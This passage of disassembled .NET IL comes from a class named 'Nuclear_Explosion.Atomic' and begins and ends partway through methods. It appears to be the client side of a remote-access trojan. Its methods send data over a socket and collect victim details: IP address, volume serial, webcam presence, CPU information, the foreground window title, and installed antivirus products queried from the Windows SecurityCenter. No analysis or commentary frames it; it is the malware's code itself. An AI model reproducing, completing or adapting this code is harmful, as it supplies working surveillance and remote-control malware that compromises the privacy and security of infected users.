      IL_003a:  box        [mscorlib]System.Int32
      IL_003f:  stelem.ref
      IL_0040:  dup
      IL_0041:  stloc.2
      IL_0042:  ldnull
      IL_0043:  ldnull
      IL_0044:  ldc.i4.3
      IL_0045:  newarr     [mscorlib]System.Boolean
      IL_004a:  dup
      IL_004b:  ldc.i4.0
      IL_004c:  ldc.i4.1
      IL_004d:  stelem.i1
      IL_004e:  dup
      IL_004f:  stloc.3
      IL_0050:  ldc.i4.1
      IL_0051:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0056:  pop
      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.0
      IL_0059:  ldelem.u1
      IL_005a:  brtrue.s   IL_005e

      IL_005c:  br.s       IL_007c

      IL_005e:  ldloc.2
      IL_005f:  ldc.i4.0
      IL_0060:  ldelem.ref
      IL_0061:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0066:  ldtoken    uint8[]
      IL_006b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0070:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0075:  castclass  uint8[]
      IL_007a:  starg.s    b
      IL_007c:  ldloc.1
      IL_007d:  ldnull
      IL_007e:  ldstr      "Write"
      IL_0083:  ldc.i4.3
      IL_0084:  newarr     [mscorlib]System.Object
      IL_0089:  dup
      IL_008a:  ldc.i4.0
      IL_008b:  ldarg.0
      IL_008c:  ldsfld     string Nuclear_Explosion.Atomic::SPL
      IL_0091:  call       instance uint8[] Nuclear_Explosion.Atomic::SB(string)
      IL_0096:  stelem.ref
      IL_0097:  dup
      IL_0098:  ldc.i4.1
      IL_0099:  ldc.i4.0
      IL_009a:  box        [mscorlib]System.Int32
      IL_009f:  stelem.ref
      IL_00a0:  dup
      IL_00a1:  ldc.i4.2
      IL_00a2:  ldsfld     string Nuclear_Explosion.Atomic::SPL
      IL_00a7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00ac:  box        [mscorlib]System.Int32
      IL_00b1:  stelem.ref
      IL_00b2:  ldnull
      IL_00b3:  ldnull
      IL_00b4:  ldnull
      IL_00b5:  ldc.i4.1
      IL_00b6:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_00bb:  pop
      IL_00bc:  ldarg.0
      IL_00bd:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_00c2:  ldnull
      IL_00c3:  ldstr      "Client"
      IL_00c8:  ldc.i4.0
      IL_00c9:  newarr     [mscorlib]System.Object
      IL_00ce:  ldnull
      IL_00cf:  ldnull
      IL_00d0:  ldnull
      IL_00d1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00d6:  ldnull
      IL_00d7:  ldstr      "SendBufferSize"
      IL_00dc:  ldc.i4.1
      IL_00dd:  newarr     [mscorlib]System.Object
      IL_00e2:  dup
      IL_00e3:  ldc.i4.0
      IL_00e4:  ldarg.1
      IL_00e5:  ldlen
      IL_00e6:  conv.i4
      IL_00e7:  box        [mscorlib]System.Int32
      IL_00ec:  stelem.ref
      IL_00ed:  ldnull
      IL_00ee:  ldnull
      IL_00ef:  ldc.i4.0
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_00f6:  nop
      IL_00f7:  ldarg.0
      IL_00f8:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_00fd:  ldnull
      IL_00fe:  ldstr      "Client"
      IL_0103:  ldc.i4.0
      IL_0104:  newarr     [mscorlib]System.Object
      IL_0109:  ldnull
      IL_010a:  ldnull
      IL_010b:  ldnull
      IL_010c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0111:  ldnull
      IL_0112:  ldstr      "Poll"
      IL_0117:  ldc.i4.2
      IL_0118:  newarr     [mscorlib]System.Object
      IL_011d:  dup
      IL_011e:  ldc.i4.0
      IL_011f:  ldc.i4.m1
      IL_0120:  box        [mscorlib]System.Int32
      IL_0125:  stelem.ref
      IL_0126:  dup
      IL_0127:  ldc.i4.1
      IL_0128:  ldc.i4.1
      IL_0129:  box        [System]System.Net.Sockets.SelectMode
      IL_012e:  stelem.ref
      IL_012f:  ldnull
      IL_0130:  ldnull
      IL_0131:  ldnull
      IL_0132:  ldc.i4.1
      IL_0133:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0138:  pop
      IL_0139:  ldarg.0
      IL_013a:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_013f:  ldnull
      IL_0140:  ldstr      "Client"
      IL_0145:  ldc.i4.0
      IL_0146:  newarr     [mscorlib]System.Object
      IL_014b:  ldnull
      IL_014c:  ldnull
      IL_014d:  ldnull
      IL_014e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0153:  ldnull
      IL_0154:  ldstr      "Send"
      IL_0159:  ldc.i4.4
      IL_015a:  newarr     [mscorlib]System.Object
      IL_015f:  dup
      IL_0160:  ldc.i4.0
      IL_0161:  ldloc.1
      IL_0162:  stloc.s    V_4
      IL_0164:  ldloc.s    V_4
      IL_0166:  ldnull
      IL_0167:  ldstr      "ToArray"
      IL_016c:  ldc.i4.0
      IL_016d:  newarr     [mscorlib]System.Object
      IL_0172:  ldnull
      IL_0173:  ldnull
      IL_0174:  ldnull
      IL_0175:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_017a:  stelem.ref
      IL_017b:  dup
      IL_017c:  ldc.i4.1
      IL_017d:  ldc.i4.0
      IL_017e:  box        [mscorlib]System.Int32
      IL_0183:  stelem.ref
      IL_0184:  dup
      IL_0185:  ldc.i4.2
      IL_0186:  ldloc.1
      IL_0187:  stloc.s    V_5
      IL_0189:  ldloc.s    V_5
      IL_018b:  ldnull
      IL_018c:  ldstr      "Length"
      IL_0191:  ldc.i4.0
      IL_0192:  newarr     [mscorlib]System.Object
      IL_0197:  ldnull
      IL_0198:  ldnull
      IL_0199:  ldnull
      IL_019a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_019f:  stelem.ref
      IL_01a0:  dup
      IL_01a1:  ldc.i4.3
      IL_01a2:  ldc.i4.0
      IL_01a3:  box        [System]System.Net.Sockets.SocketFlags
      IL_01a8:  stelem.ref
      IL_01a9:  dup
      IL_01aa:  stloc.2
      IL_01ab:  ldnull
      IL_01ac:  ldnull
      IL_01ad:  ldc.i4.4
      IL_01ae:  newarr     [mscorlib]System.Boolean
      IL_01b3:  dup
      IL_01b4:  ldc.i4.0
      IL_01b5:  ldc.i4.1
      IL_01b6:  stelem.i1
      IL_01b7:  dup
      IL_01b8:  ldc.i4.2
      IL_01b9:  ldc.i4.1
      IL_01ba:  stelem.i1
      IL_01bb:  dup
      IL_01bc:  stloc.3
      IL_01bd:  ldc.i4.1
      IL_01be:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01c3:  pop
      IL_01c4:  ldloc.3
      IL_01c5:  ldc.i4.0
      IL_01c6:  ldelem.u1
      IL_01c7:  brtrue.s   IL_01cb

      IL_01c9:  br.s       IL_01e9

      IL_01cb:  ldloc.s    V_4
      IL_01cd:  ldnull
      IL_01ce:  ldstr      "ToArray"
      IL_01d3:  ldc.i4.1
      IL_01d4:  newarr     [mscorlib]System.Object
      IL_01d9:  dup
      IL_01da:  ldc.i4.0
      IL_01db:  ldloc.2
      IL_01dc:  ldc.i4.0
      IL_01dd:  ldelem.ref
      IL_01de:  stelem.ref
      IL_01df:  ldnull
      IL_01e0:  ldnull
      IL_01e1:  ldc.i4.1
      IL_01e2:  ldc.i4.0
      IL_01e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_01e8:  nop
      IL_01e9:  ldloc.3
      IL_01ea:  ldc.i4.2
      IL_01eb:  ldelem.u1
      IL_01ec:  brtrue.s   IL_01f0

      IL_01ee:  br.s       IL_020e

      IL_01f0:  ldloc.s    V_5
      IL_01f2:  ldnull
      IL_01f3:  ldstr      "Length"
      IL_01f8:  ldc.i4.1
      IL_01f9:  newarr     [mscorlib]System.Object
      IL_01fe:  dup
      IL_01ff:  ldc.i4.0
      IL_0200:  ldloc.2
      IL_0201:  ldc.i4.2
      IL_0202:  ldelem.ref
      IL_0203:  stelem.ref
      IL_0204:  ldnull
      IL_0205:  ldnull
      IL_0206:  ldc.i4.1
      IL_0207:  ldc.i4.0
      IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_020d:  nop
      IL_020e:  ldloc.1
      IL_020f:  ldnull
      IL_0210:  ldstr      "Dispose"
      IL_0215:  ldc.i4.0
      IL_0216:  newarr     [mscorlib]System.Object
      IL_021b:  ldnull
      IL_021c:  ldnull
      IL_021d:  ldnull
      IL_021e:  ldc.i4.1
      IL_021f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0224:  pop
      IL_0225:  leave.s    IL_023b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0227:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_022c:  nop
      IL_022d:  ldarg.0
      IL_022e:  ldc.i4.0
      IL_022f:  stfld      bool Nuclear_Explosion.Atomic::Cn
      IL_0234:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0239:  leave.s    IL_023b

    }  // end handler
    IL_023b:  nop
    IL_023c:  ret
  } // end of method Atomic::Send

  .method public instance void  Send(string S) cil managed
  {
    // Code size       16 (0x10)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.0
    IL_0003:  ldarg.1
    IL_0004:  call       instance uint8[] Nuclear_Explosion.Atomic::SB(string)
    IL_0009:  call       instance void Nuclear_Explosion.Atomic::Send(uint8[])
    IL_000e:  nop
    IL_000f:  ret
  } // end of method Atomic::Send

  .method public instance object  IP() cil managed
  {
    // Code size       57 (0x39)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  call       string [System]System.Net.Dns::GetHostName()
      IL_0007:  call       class [System]System.Net.IPHostEntry [System]System.Net.Dns::GetHostByName(string)
      IL_000c:  callvirt   instance class [System]System.Net.IPAddress[] [System]System.Net.IPHostEntry::get_AddressList()
      IL_0011:  ldc.i4.0
      IL_0012:  callvirt   instance object [mscorlib]System.Array::GetValue(int32)
      IL_0017:  castclass  [System]System.Net.IPAddress
      IL_001c:  callvirt   instance string [System]System.Net.IPAddress::ToString()
      IL_0021:  stloc.0
      IL_0022:  leave.s    IL_0037

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0029:  nop
      IL_002a:  ldstr      "\?\?\?\?"
      IL_002f:  stloc.0
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0035:  leave.s    IL_0037

    }  // end handler
    IL_0037:  ldloc.0
    IL_0038:  ret
  } // end of method Atomic::IP

  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GVI(string&  marshal( byvalstr) IP,
                     string&  marshal( byvalstr) V,
                     int32 T,
                     int32& H,
                     int32& Q,
                     int32& G,
                     string&  marshal( byvalstr) J,
                     int32 X) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "GetForegroundWindow" nomangle ansi lasterr winapi) 
          native int  GFW() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" autochar lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               class [mscorlib]System.Text.StringBuilder lpString,
                               int32 cch) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("psapi" winapi) 
          bool  EmptyWorkingSet(int64 hProcess) cil managed preservesig
  {
  }
  .method public instance string  HWD() cil managed
  {
    // Code size       84 (0x54)
    .maxstack  8
    .locals init (string V_0,
             int32 V_1,
             string V_2,
             string V_3,
             int32 V_4,
             int32 V_5,
             string V_6)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldstr      "SystemDrive"
      IL_0007:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_000c:  ldstr      "\\"
      IL_0011:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0016:  stloc.2
      IL_0017:  ldloca.s   V_2
      IL_0019:  ldnull
      IL_001a:  stloc.3
      IL_001b:  ldloca.s   V_3
      IL_001d:  ldc.i4.0
      IL_001e:  ldloca.s   V_1
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.s    V_4
      IL_0023:  ldloca.s   V_4
      IL_0025:  ldc.i4.0
      IL_0026:  stloc.s    V_5
      IL_0028:  ldloca.s   V_5
      IL_002a:  ldnull
      IL_002b:  stloc.s    V_6
      IL_002d:  ldloca.s   V_6
      IL_002f:  ldc.i4.0
      IL_0030:  call       int32 Nuclear_Explosion.Atomic::GVI(string&,
                                                               string&,
                                                               int32,
                                                               int32&,
                                                               int32&,
                                                               int32&,
                                                               string&,
                                                               int32)
      IL_0035:  pop
      IL_0036:  ldloc.1
      IL_0037:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Conversion::Hex(int32)
      IL_003c:  stloc.0
      IL_003d:  leave.s    IL_0052

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  nop
      IL_0045:  ldstr      "ERR"
      IL_004a:  stloc.0
      IL_004b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0050:  leave.s    IL_0052

    }  // end handler
    IL_0052:  ldloc.0
    IL_0053:  ret
  } // end of method Atomic::HWD

  .method public instance string  CIVC() cil managed
  {
    // Code size       77 (0x4d)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             bool V_2,
             string V_3,
             string V_4)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldnull
      IL_0013:  stloc.s    V_4
      IL_0015:  ldloca.s   V_4
      IL_0017:  ldc.i4.s   100
      IL_0019:  call       bool Nuclear_Explosion.Atomic::capGetDriverDescriptionA(int16,
                                                                                   string&,
                                                                                   int32,
                                                                                   string&,
                                                                                   int32)
      IL_001e:  stloc.2
      IL_001f:  ldloc.2
      IL_0020:  brfalse.s  IL_002a

      IL_0022:  ldstr      "Yes"
      IL_0027:  stloc.0
      IL_0028:  leave.s    IL_004b

      IL_002a:  nop
      IL_002b:  ldloc.1
      IL_002c:  ldc.i4.1
      IL_002d:  add.ovf
      IL_002e:  stloc.1
      IL_002f:  ldloc.1
      IL_0030:  ldc.i4.4
      IL_0031:  ble.s      IL_0004

      IL_0033:  leave.s    IL_0042

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  nop
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0040:  leave.s    IL_0042

    }  // end handler
    IL_0042:  nop
    IL_0043:  ldstr      "No"
    IL_0048:  stloc.0
    IL_0049:  br.s       IL_004b

    IL_004b:  ldloc.0
    IL_004c:  ret
  } // end of method Atomic::CIVC

  .method public static string  OP() cil managed
  {
    // Code size       113 (0x71)
    .maxstack  2
    .locals init (string V_0,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_1,
             class [System.Management]System.Management.ManagementObject V_2,
             bool V_3)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      .try
      {
        IL_0002:  ldstr      "select * from Win32_Processor"
        IL_0007:  newobj     instance void [System.Management]System.Management.ManagementObjectSearcher::.ctor(string)
        IL_000c:  call       instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementObjectSearcher::Get()
        IL_0011:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
        IL_0016:  stloc.1
        IL_0017:  br.s       IL_0042

        IL_0019:  ldloc.1
        IL_001a:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
        IL_001f:  castclass  [System.Management]System.Management.ManagementObject
        IL_0024:  stloc.2
        IL_0025:  ldloc.2
        IL_0026:  ldstr      "AddressWidth"
        IL_002b:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
        IL_0030:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0035:  call       int32 [mscorlib]System.Convert::ToInt32(object)
        IL_003a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_003f:  stloc.0
        IL_0040:  leave.s    IL_006f

        IL_0042:  ldloc.1
        IL_0043:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
        IL_0048:  stloc.3
        IL_0049:  ldloc.3
        IL_004a:  brtrue.s   IL_0019

        IL_004c:  leave.s    IL_0059

      }  // end .try
      finally
      {
        IL_004e:  ldloc.1
        IL_004f:  brfalse.s  IL_0058

        IL_0051:  ldloc.1
        IL_0052:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0057:  nop
        IL_0058:  endfinally
      }  // end handler
      IL_0059:  leave.s    IL_006e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0060:  nop
      IL_0061:  ldstr      "\?\?\?\?"
      IL_0066:  stloc.0
      IL_0067:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006c:  leave.s    IL_006f

    }  // end handler
    IL_006e:  nop
    IL_006f:  ldloc.0
    IL_0070:  ret
  } // end of method Atomic::OP

  .method public instance string  GetProduct(string Product) cil managed
  {
    // Code size       226 (0xe2)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator V_2,
             class [System.Management]System.Management.ManagementObject V_3,
             bool V_4,
             bool V_5)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldsfld     string [mscorlib]System.String::Empty
      IL_0007:  stloc.1
      .try
      {
        IL_0008:  ldstr      "root\\SecurityCenter"
        IL_000d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo Nuclear_Explosion.Atomic::DI
        IL_0012:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
        IL_0017:  ldstr      "XP"
        IL_001c:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_0021:  ldstr      ""
        IL_0026:  ldstr      "2"
        IL_002b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::IIf(bool,
                                                                                                  object,
                                                                                                  object)
        IL_0030:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_003a:  ldarg.1
        IL_003b:  newobj     instance void [System.Management]System.Management.ManagementObjectSearcher::.ctor(string,
                                                                                                                string)
        IL_0040:  call       instance class [System.Management]System.Management.ManagementObjectCollection [System.Management]System.Management.ManagementObjectSearcher::Get()
        IL_0045:  callvirt   instance class [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator [System.Management]System.Management.ManagementObjectCollection::GetEnumerator()
        IL_004a:  stloc.2
        IL_004b:  br.s       IL_0071

        IL_004d:  ldloc.2
        IL_004e:  callvirt   instance class [System.Management]System.Management.ManagementBaseObject [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::get_Current()
        IL_0053:  castclass  [System.Management]System.Management.ManagementObject
        IL_0058:  stloc.3
        IL_0059:  ldloc.1
        IL_005a:  ldloc.3
        IL_005b:  ldstr      "displayName"
        IL_0060:  callvirt   instance object [System.Management]System.Management.ManagementBaseObject::get_Item(string)
        IL_0065:  callvirt   instance string [mscorlib]System.Object::ToString()
        IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_006f:  stloc.1
        IL_0070:  nop
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance bool [System.Management]System.Management.ManagementObjectCollection/ManagementObjectEnumerator::MoveNext()
        IL_0077:  stloc.s    V_4
        IL_0079:  ldloc.s    V_4
        IL_007b:  brtrue.s   IL_004d

        IL_007d:  leave.s    IL_008a

      }  // end .try
      finally
      {
        IL_007f:  ldloc.2
        IL_0080:  brfalse.s  IL_0089

        IL_0082:  ldloc.2
        IL_0083:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0088:  nop
        IL_0089:  endfinally
      }  // end handler
      IL_008a:  ldloc.1
      IL_008b:  ldsfld     string [mscorlib]System.String::Empty
      IL_0090:  ldc.i4.0
      IL_0091:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0096:  ldc.i4.0
      IL_0097:  cgt.un
      IL_0099:  stloc.s    V_5
      IL_009b:  ldloc.s    V_5
      IL_009d:  brfalse.s  IL_00ae

      IL_009f:  ldarg.0
      IL_00a0:  ldloc.1
      IL_00a1:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_00a6:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00ab:  stloc.0
      IL_00ac:  leave.s    IL_00e0

      IL_00ae:  nop
      IL_00af:  ldarg.0
      IL_00b0:  ldstr      "N/A"
      IL_00b5:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_00ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00bf:  stloc.0
      IL_00c0:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c7:  nop
      IL_00c8:  ldarg.0
      IL_00c9:  ldstr      "N/A"
      IL_00ce:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_00d3:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_00d8:  stloc.0
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldloc.0
    IL_00e1:  ret
  } // end of method Atomic::GetProduct

  .method public instance object  MP() cil managed
  {
    // Code size       47 (0x2f)
    .maxstack  3
    .locals init (object V_0)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldstr      "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CEN"
      + "TRALPROCESSOR\\0"
      IL_0007:  ldstr      "ProcessorNameString"
      IL_000c:  ldnull
      IL_000d:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_0012:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0017:  stloc.0
      IL_0018:  leave.s    IL_002d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  nop
      IL_0020:  ldstr      "\?\?\?\?"
      IL_0025:  stloc.0
      IL_0026:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002b:  leave.s    IL_002d

    }  // end handler
    IL_002d:  ldloc.0
    IL_002e:  ret
  } // end of method Atomic::MP

  .method public instance string  GAW() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x100
    IL_0006:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_000b:  stloc.1
    IL_000c:  call       native int Nuclear_Explosion.Atomic::GFW()
    IL_0011:  ldloc.1
    IL_0012:  ldloc.1
    IL_0013:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Capacity()
    IL_0018:  call       int32 Nuclear_Explosion.Atomic::GetWindowText(native int,
                                                                       class [mscorlib]System.Text.StringBuilder,
                                                                       int32)
    IL_001d:  pop
    IL_001e:  ldarg.0
    IL_001f:  ldloc.1
    IL_0020:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
    IL_0025:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
    IL_002a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_002f:  stloc.0
    IL_0030:  br.s       IL_0032

    IL_0032:  ldloc.0
    IL_0033:  ret
  } // end of method Atomic::GAW

  .method public instance uint8[]  SB(string s) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  2
    .locals init (uint8[] V_0)
